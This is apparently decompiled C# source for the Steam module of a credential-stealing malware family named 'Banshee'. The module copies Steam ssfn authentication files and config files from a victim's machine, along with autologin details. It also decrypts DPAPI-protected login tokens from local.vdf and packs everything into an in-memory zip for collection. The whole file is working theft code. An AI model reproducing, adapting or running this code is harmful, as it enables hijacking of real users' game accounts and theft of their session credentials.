﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Games
{
	// Token: 0x0200004C RID: 76
	public class Steam : ITarget
	{
		// Token: 0x060000B2 RID: 178 RVA: 0x00005E94 File Offset: 0x00005E94
		public void Collect(InMemoryZip zip, Counter counter)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (registryKey == null || registryKey.GetValue("SteamPath") == null)
			{
				return;
			}
			string text = registryKey.GetValue("SteamPath").ToString();
			if (!Directory.Exists(text))
			{
				return;
			}
			string path = "Steam";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Steam";
			try
			{
				RegistryKey registryKey2 = registryKey.OpenSubKey("Apps");
				if (registryKey2 != null)
				{
					List<string> list = new List<string>();
					foreach (string text2 in registryKey2.GetSubKeyNames())
					{
						using (RegistryKey registryKey3 = registryKey.OpenSubKey("Apps\\" + text2))
						{
							if (registryKey3 != null)
							{
								string text3 = (registryKey3.GetValue("Name") as string) ?? "Unknown";
								string text4 = (((int?)registryKey3.GetValue("Installed")).GetValueOrDefault() == 1) ? "Yes" : "No";
								string text5 = (((int?)registryKey3.GetValue("Running")).GetValueOrDefault() == 1) ? "Yes" : "No";
								string text6 = (((int?)registryKey3.GetValue("Updating")).GetValueOrDefault() == 1) ? "Yes" : "No";
								list.Add(string.Concat(new string[]
								{
									"Application: ",
									text3,
									"\n\tGameID: ",
									text2,
									"\n\tInstalled: ",
									text4,
									"\n\tRunning: ",
									text5,
									"\n\tUpdating: ",
									text6
								}));
							}
						}
					}
					if (list.Count > 0)
					{
						string text7 = Path.Combine(path, "Apps.txt");
						zip.AddTextFile(ZipPath.Games(text7), string.Join("\n\n", list));
						counterApplications.Files.Add("Software\\Valve\\Steam\\Apps => " + text7);
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (string text8 in Directory.GetFiles(text))
				{
					if (text8.Contains("ssfn"))
					{
						byte[] content = File.ReadAllBytes(text8);
						string text9 = Path.Combine(path, "ssfn", Path.GetFileName(text8));
						zip.AddFile(ZipPath.Games(text9), content);
						counterApplications.Files.Add(text8 + " => " + text9);
					}
				}
			}
			catch
			{
			}
			try
			{
				string path2 = Path.Combine(text, "config");
				if (Directory.Exists(path2))
				{
					foreach (string text10 in Directory.GetFiles(path2, "*.vdf"))
					{
						string text11 = Path.Combine(path, "configs", Path.GetFileName(text10));
						zip.AddFile(ZipPath.Games(text11), File.ReadAllBytes(text10));
						counterApplications.Files.Add(text10 + " => " + text11);
					}
				}
			}
			catch
			{
			}
			try
			{
				object value = registryKey.GetValue("AutoLoginUser");
				string str = ((value != null) ? value.ToString() : null) ?? "Unknown";
				string str2 = (((int?)registryKey.GetValue("RememberPassword")).GetValueOrDefault() == 1) ? "Yes" : "No";
				string text12 = "Autologin User: " + str + "\nRemember password: " + str2;
				string text13 = Path.Combine(path, "SteamInfo.txt");
				zip.AddTextFile(ZipPath.Games(text13), text12);
				counterApplications.Files.Add("Software\\Valve\\Steam => " + text13);
			}
			catch
			{
			}
			try
			{
				string[] array2 = new string[]
				{
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Steam", "local.vdf")
				};
				IEnumerable<string> source = new string[]
				{
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf"),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "config", "loginusers.vdf")
				};
				IEnumerable<string> source2 = array2;
				Func<string, bool> predicate;
				if ((predicate = Steam.<>O.<0>__Exists) == null)
				{
					predicate = (Steam.<>O.<0>__Exists = new Func<string, bool>(File.Exists));
				}
				string text14 = source2.FirstOrDefault(predicate);
				Func<string, bool> predicate2;
				if ((predicate2 = Steam.<>O.<0>__Exists) == null)
				{
					predicate2 = (Steam.<>O.<0>__Exists = new Func<string, bool>(File.Exists));
				}
				string text15 = source.FirstOrDefault(predicate2);
				if (text14 == null || text15 == null)
				{
					return;
				}
				string pattern = "\"AccountName\"\\s*\"([^\"]+)\"";
				string pattern2 = "([a-fA-F0-9]{500,2000})";
				MatchCollection matchCollection = Regex.Matches(File.ReadAllText(text15), pattern);
				MatchCollection matchCollection2 = Regex.Matches(File.ReadAllText(text14), pattern2);
				if (matchCollection.Count == 0 || matchCollection2.Count == 0)
				{
					return;
				}
				List<string> list2 = new List<string>();
				foreach (object obj in matchCollection)
				{
					Match match = (Match)obj;
					byte[] bytes = Encoding.UTF8.GetBytes(match.Groups[1].Value);
					using (IEnumerator enumerator2 = matchCollection2.GetEnumerator())
					{
						while (enumerator2.MoveNext())
						{
							Match tokenMatch = (Match)enumerator2.Current;
							byte[] encryptedData = (from x in Enumerable.Range(0, tokenMatch.Value.Length / 2)
							select Convert.ToByte(tokenMatch.Value.Substring(x * 2, 2), 16)).ToArray<byte>();
							try
							{
								byte[] bytes2 = ProtectedData.Unprotect(encryptedData, bytes, DataProtectionScope.LocalMachine);
								list2.Add(Encoding.UTF8.GetString(bytes2));
								break;
							}
							catch
							{
							}
						}
					}
				}
				if (list2.Count > 0)
				{
					string text16 = Path.Combine(path, "Token.txt");
					zip.AddTextFile(ZipPath.Games(text16), string.Join("\n", list2));
					counterApplications.Files.Add(text14 + " => " + text16);
					counterApplications.Files.Add(text15 + " => " + text16);
				}
			}
			catch
			{
			}
			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add("Steam\\");
				counter.Games.Add(counterApplications);
			}
		}

		// Token: 0x0200004D RID: 77
		[CompilerGenerated]
		private static class <>O
		{
			// Token: 0x04000094 RID: 148
			public static Func<string, bool> <0>__Exists;
		}
	}
}
